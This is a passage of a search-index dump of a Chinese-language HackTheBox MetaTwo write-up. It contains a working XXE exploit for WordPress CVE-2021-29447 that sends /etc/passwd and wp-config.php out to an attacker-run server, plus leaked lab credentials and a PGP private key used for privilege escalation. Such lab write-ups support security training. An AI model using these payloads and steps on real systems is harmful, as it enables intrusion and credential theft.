\u6210\u529f\u767b\u5165\u540e\u7b2c\u4e00\u60f3\u6cd5\u5c31\u662f\u627e\u4e0a\u4f20\u70b9\uff0c\u672c\u6765\u4ee5\u4e3a\u53ef\u4ee5\u7b80\u5355\u5730\u4f20\u4e2aphp\u7684webshell\u5c31\u884c\uff0c\u4e0d\u8fc7\u8fd9\u4e2a\u7f51\u7ad9\u7684\u4e0a\u4f20\u4f3c\u4e4e\u4e0d\u80fd\u4f20php\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MetaTwo/#poccve-2021-29447","title":"PoC\uff08CVE-2021-29447\uff09","text":"<p>\u8c37\u6b4c\u641c\u4e00\u6ce2 <code>wordpress 5.6.2 upload exploit</code>\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u6f0f\u6d1e\uff1aCVE-2021-29447\u3002</p> <p>https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447 https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5 https://github.com/motikan2010/CVE-2021-29447 </p> <p>\u8bd5\u4e86\u4e00\u4e0b\u63a5\u6536\u54cd\u5e94\uff0c\u6210\u529f\u8fd4\u56de\u4e86 <code>/etc/passwd</code> \u7684base64\u7f16\u7801\uff1a <pre><code>$ echo -en 'RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '\"'\"'http://10.10.14.6:80/evil.dtd'\"'\"'&gt;%remote;%init;%trick;]&gt;\\x00' &gt; payload.wav\n\n\n$ cat evil.dtd \n&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\"&gt;\n&lt;!ENTITY % init \"&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.14.6:80/?p=%file;'&gt;\" &gt;\n\n\n$ python -m http.server 80  \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.11.186 - - [21/Dec/2022 07:46:28] \"GET /evil.dtd HTTP/1.1\" 200 -\n10.10.11.186 - - [21/Dec/2022 07:46:28] \"GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1\" 200 -\n</code></pre></p> <p>\u5c06\u6587\u4ef6\u83b7\u53d6\u7684\u8def\u5f84\u6362\u6210 <code>../wp-config.php</code> \u5355\u7eaf\u56e0\u4e3a\u4e0a\u9762\u7684\u6587\u7ae0\u91cc\u6709\u8fd9\u4e2a\u6587\u4ef6\u5c31\u8bd5\u4e86\u4e0b\uff0c\u4e0d\u8fc7\u4f3c\u4e4e\u56e0\u6b64\u627e\u5230\u4e86\u5f88\u6709\u610f\u4e49\u7684\u6587\u4ef6\uff08\u540e\u6765\u61c2\u4e86\u8fd9\u4e2a\u662fWordPress\u8f83\u91cd\u8981\u7684\u6587\u4ef6\u2026\u2026\uff09 \u8fd4\u56de\u7684base64\u7f16\u7801\u5982\u4e0b: <pre><code>PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==\n</code></pre></p> <p>\u7528CyberChef\u89e3\u7801\u540e\u53d1\u73b0\u91cc\u9762\u6709DB\u3001FTP\u7684\u8d26\u53f7\u5bc6\u7801\u3002</p> <p>DB\u4f3c\u4e4e\u76ee\u524d\u8fd8\u65e0\u4ece\u4e0b\u624b\uff0c\u4f46\u522b\u5fd8\u8bb0\u6211\u4eec\u626b\u5230\u8fc7FTP\u7aef\u53e3\u3002 \u5c1d\u8bd5\u8fde\u63a5FTP\u6210\u529f\uff0c\u4f3c\u4e4e\u662fWordPress\u548c\u4ec0\u4e48\u90ae\u4ef6\u7684\u6587\u4ef6\u5939\uff08\u5907\u4efd\uff09\uff1f \u4e00\u4e2a\u4e00\u4e2aget\u592a\u6162\u4e86\uff0c\u4e8e\u662f\u53c2\u8003\u8fd9\u91cc\uff0c\u7528wget\u628aFTP\u4e0a\u7684\u6587\u4ef6\u90fd\u4e0b\u8f7d\u4e0b\u6765\u6162\u6162\u770b\uff08\u6ce8\u610f\uff1a\u5bc6\u7801\u7531\u4e8e\u6709\u7279\u6b8a\u5b57\u7b26\u6240\u4ee5\u8981\u7528\u5f15\u53f7\u62ec\u4f4f\uff09\u3002 \u6587\u4ef6\u633a\u591a\u7684\u6837\u5b50\uff0c\u653e\u540e\u53f0\u6162\u6162\u4e0b\u3002  </p> <p>\u4f46\u662f\u5176\u5b9e\u6211\u662f\u671f\u671bget shell\u7684\u3002 \u4e0d\u8fc7\u5bf9PHP\u4e0d\u592a\u719f\u6089\u2026\u2026\u53c8\u641c\u4e86\u4e00\u4e0b\u770b\u770b\u80fd\u5426\u66f4\u6539\u5c06PoC\u91cc\u7684 <code>&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\"&gt;</code> \u6539\u6210\u547d\u4ee4\u6267\u884c\u3002 \u4e0d\u8fc7\u4f3c\u4e4e\u4e0d\u884c\uff1a  </p> <p>php:// \u2014 Accessing various I/O streams</p> <p>\u4ee5\u53ca\u4ed4\u7ec6\u770b\u4e86\u770b\u5176\u5b9eCVE-2021-29447\u7684\u6587\u7ae0\u4ecb\u7ecd\u4e86\u8fd9\u4e2a\u6f0f\u6d1e\u662f\uff1a\u5bfc\u81f4\u8fdc\u7a0b\u4efb\u610f\u6587\u4ef6\u6cc4\u9732\u548c\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020 (SSRF)\u3002</p> <p>\u90a3\u5c31\u6682\u65f6\u5148\u7b49FTP\u7684\u6587\u4ef6\u4e0b\u5b8c\u5427\u2026\u2026</p> <p>\u4ee5\u53ca\u7531\u4e8e\u4e4b\u524d\u83b7\u53d6\u4e86 <code>/etc/passwd</code>\uff0c\u770b\u4e86\u773c\u6709\u4e2a\u7528\u6237\uff08<code>jnelson:x:1000</code>\uff09\u6bd4\u8f83\u50cf\u662f\u653euser flag\u7684\u7528\u6237\uff0c\u987a\u4fbf\u8bd5\u4e86\u8bd5\u83b7\u53d6 <code>/home/jnelson/user.txt</code>\u3002\u4e0d\u8fc7\u867d\u7136\u6709200\u54cd\u5e94\uff0c\u4f46\u662f\u5e76\u672a\u83b7\u53d6\u5230\u4ec0\u4e48\u6570\u636e\u3002\u5927\u6982\u662f\u6ca1\u6709\u8bfb\u53d6\u6743\u9650\u5427\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MetaTwo/#initial-access","title":"Initial Access","text":"<p>\u51b2\u4e86\u4e00\u4f1a\u513f\u6d6a\uff0cFTP\u4e0b\u8f7d\u5b8c\u6bd5\uff0c\u7adf\u7136\u6709\u4e24\u5343\u591a\u4e2a\u6587\u4ef6\u2026\u2026</p> <p>email\u8fd9\u4e2a\u6587\u4ef6\u5939\u91cc\u7684\u6587\u4ef6\u8ba9\u4eba\u611f\u5174\u8da3\uff0c\u5728\u91cc\u9762\u53d1\u73b0\u4e86\u7528\u6237 <code>jnelson</code> \u7684\u90ae\u7bb1&amp;\u5bc6\u7801\uff08\u73b0\u5728\u60f3\u60f3\u6839\u672c\u6ca1\u5fc5\u8981\u628a\u6574\u4e2aFTP\u7684\u6587\u4ef6\u90fd\u4e0b\u4e0b\u6765\u2026\u2026\uff09\uff1a <pre><code>$ cat send_email.php             \n&lt;?php\n/*\n * This script will be used to send an email to all our users when ready for launch\n*/\n\nuse PHPMailer\\PHPMailer\\PHPMailer;\nuse PHPMailer\\PHPMailer\\SMTP;\nuse PHPMailer\\PHPMailer\\Exception;\n\nrequire 'PHPMailer/src/Exception.php';\nrequire 'PHPMailer/src/PHPMailer.php';\nrequire 'PHPMailer/src/SMTP.php';\n\n$mail = new PHPMailer(true);\n\n$mail-&gt;SMTPDebug = 3;                               \n$mail-&gt;isSMTP();            \n\n$mail-&gt;Host = \"mail.metapress.htb\";\n$mail-&gt;SMTPAuth = true;                          \n$mail-&gt;Username = \"jnelson@metapress.htb\";                 \n$mail-&gt;Password = \"Cb4_JmWM8zUZWMu@Ys\";                           \n$mail-&gt;SMTPSecure = \"tls\";                           \n$mail-&gt;Port = 587;                                   \n\n$mail-&gt;From = \"jnelson@metapress.htb\";\n$mail-&gt;FromName = \"James Nelson\";\n\n$mail-&gt;addAddress(\"info@metapress.htb\");\n\n$mail-&gt;isHTML(true);\n\n$mail-&gt;Subject = \"Startup\";\n$mail-&gt;Body = \"&lt;i&gt;We just started our new blog metapress.htb!&lt;/i&gt;\";\n</code></pre></p> <p>\u5c1d\u8bd5SSH\u8fde\u63a5\u6210\u529f~\u771f\u662f\u66f2\u6298\u554a\u2026\u2026</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MetaTwo/#flag-user","title":"flag: user","text":"<pre><code>jnelson@meta2:~$ cat user.txt \n819\u2026\u2026\u2026\u202678428\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MetaTwo/#privilege-escalation","title":"Privilege Escalation","text":"<p>\u7531\u4e8e\u4e4b\u524dXXE\u7684\u6f0f\u6d1e\u4e2d\u83b7\u53d6\u7684\u54cd\u5e94\u91cc\u6709DB\u7684\u8d26\u6237\u5bc6\u7801\uff0c<code>/etc/hosts</code> \u6587\u4ef6\u91cc\u4e5f\u6709mysql\u7528\u6237\uff0c\u9042\u5c1d\u8bd5\u4e00\u6ce2\u8fde\u63a5DB\u3002\u4f46\u662f\u7ed3\u679c\u663e\u793a\u62d2\u7edd\u6211\u6536\u96c6\u5230\u7684 <code>blog</code> \u7528\u6237\u6765\u8fdb\u884c\u8bbf\u95ee\u2026\u2026 <pre><code>jnelson@meta2:~$ mysql -u blog \nERROR 1045 (28000): Access denied for user 'blog'@'localhost' (using password: NO)\njnelson@meta2:~$ mysql -u blog -h localhost\nERROR 1045 (28000): Access denied for user 'blog'@'localhost' (using password: NO)\n</code></pre></p> <p>\u90a3\u53ea\u80fd\u7528\u901a\u5e38\u5957\u8def\u4e86  </p> <ul> <li>\u786e\u8ba4\u4e86\u4e00\u4e0b <code>sudo -l</code>\uff0c\u65e0\u5229\u7528</li> <li>\u641c\u4e86\u4e0bSUID\u6587\u4ef6\uff0c\u6ca1\u53d1\u73b0\u5f02\u5e38</li> <li>\u770b\u4e86\u773c\u7528\u6237\u7684\u5bb6\u76ee\u5f55\uff0c\u53d1\u73b0\u4e2a\u4e0d\u5bfb\u5e38\u7684\u6587\u4ef6\u540d\uff0c\u5728\u91cc\u9762\u53d1\u73b0\u4e86root\u7684\u4ec0\u4e48\u5bc6\u94a5\u6587\u4ef6\uff1a</li> </ul> <pre><code>jnelson@meta2:~/.passpie/ssh$ cat root.pass \ncomment: ''\nfullname: root@ssh\nlogin: root\nmodified: 2022-06-26 08:58:15.621572\nname: ssh\npassword: '-----BEGIN PGP MESSAGE-----\n\n\nhQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2\n\nnAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km\n\nyG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED\n\n/2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf\n\niMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg\n\nkrndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw\n\nmboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr\n\nlpF0RatbxQGWBks5F3o=\n\n=uh1B\n\n-----END PGP MESSAGE-----\n\n'\n</code></pre> <p>\u770b\u4e86\u4e00\u4e0b\u8fd9\u4e2a <code>passpie</code> \u662f\u4e2a\u547d\u4ee4\u3002 <code>list</code> \u770b\u4e86\u770b\u6709\u4e24\u4e2a\u7528\u6237\uff0c\u6709\u4e2a <code>export</code>\uff0c\u90a3\u8bd5\u8bd5\u5bfc\u51fa\u5bc6\u7801\u3002 \u4e0d\u8fc7\u4f3c\u4e4e\u8981\u5f53\u524d\u7528\u6237\u7684\u4ec0\u4e48\u5bc6\u7801\u77ed\u8bed\uff0c\u8bd5\u4e86\u4e0bssh\u7684\u5bc6\u7801\u4e0d\u884c\uff1a  <pre><code>jnelson@meta2:~/.passpie/ssh$ which passpie\n/usr/local/bin/passpie\njnelson@meta2:~/.passpie/ssh$ passpie --help\nUsage: passpie [OPTIONS] COMMAND [ARGS]...\n\n...\n\n\njnelson@meta2:~/.passpie$ passpie list\n\u2552\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2564\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2564\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2564\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2555\n\u2502 Name   \u2502 Login   \u2502 Password   \u2502 Comment   \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 ssh    \u2502 jnelson \u2502 ********   \u2502           \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 ssh    \u2502 root    \u2502 ********   \u2502           \u2502\n\u2558\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2567\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2567\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2567\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255b\n\n\njnelson@meta2:~$ passpie export\nUsage: passpie export [OPTIONS] FILEPATH\n\nError: Missing argument \"filepath\".\njnelson@meta2:~$ passpie export pass\nPassphrase: \nError: Wrong passphrase\n</code></pre></p> <p>\u53c8\u770b\u4e86\u4e00\u5708\uff0c\u53d1\u73b0\u4e86\u4e2a\u5bc6\u94a5\u5bf9\uff0c\u4f30\u8ba1\u8ddf\u90a3\u4e2a\u5bc6\u7801\u77ed\u8bed\u6709\u5173\uff1a <pre><code>jnelson@meta2:~/.passpie$ cat .keys \n-----BEGIN PGP PUBLIC KEY BLOCK-----\n\n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\nfo6KI+w2uXLaw+bIT1XZurDN\n=dqsF\n-----END PGP PUBLIC KEY BLOCK-----\n-----BEGIN PGP PRIVATE KEY BLOCK-----\n\nlQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1\nAiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD\n/GYn9FIjUAWqnfdnttBbvBjseL4sECpmgxTIjKbWAXlqgEgNjXD306IweEy2FOho\n3LpAXxfk8C/qUCKcpxaz0G2k0do4+VTKZ+5UDpqM5++soJqhCrUYudb9zyVyXTpT\nZjMvyXe5NeC7JhBCKh+/Wqc4xyBcwhDdW+WU54vuFUthn+PUubEN1m+s13BkyvHV\ngNAM4v6terRItXdKvgvHtJxE0vhlNSjFAedACHC4sN+dRqFu4li8XPIVYGkuK9pX\n5xA6Nj+8UYRoZrP4SYtaDslT63ZaLd2MvwP+xMw2XEv8Uj3TGq6BIVWmajbsqkEp\ntQkU7d+nPt1aw2sA265vrIzry02NAhxL9YQGNJmXFbZ0p8cT3CswedP8XONmVdxb\na1UfdG+soO3jtQsBAKbYl2yF/+D81v+42827iqO6gqoxHbc/0epLq